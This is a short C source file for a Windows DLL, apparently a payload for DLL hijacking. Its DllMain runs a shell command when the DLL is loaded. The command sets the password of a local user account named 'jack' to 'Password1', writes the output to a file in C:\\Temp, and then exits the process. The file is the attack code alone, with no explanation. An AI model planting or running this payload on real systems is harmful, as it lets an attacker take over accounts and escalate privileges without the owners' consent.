#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
  if (dwReason == DLL_PROCESS_ATTACH) {
    system("cmd.exe /k net user jack Password1 > C:\\Temp\\dll.txt");
      ExitProcess(0);
  }
  return TRUE;
}
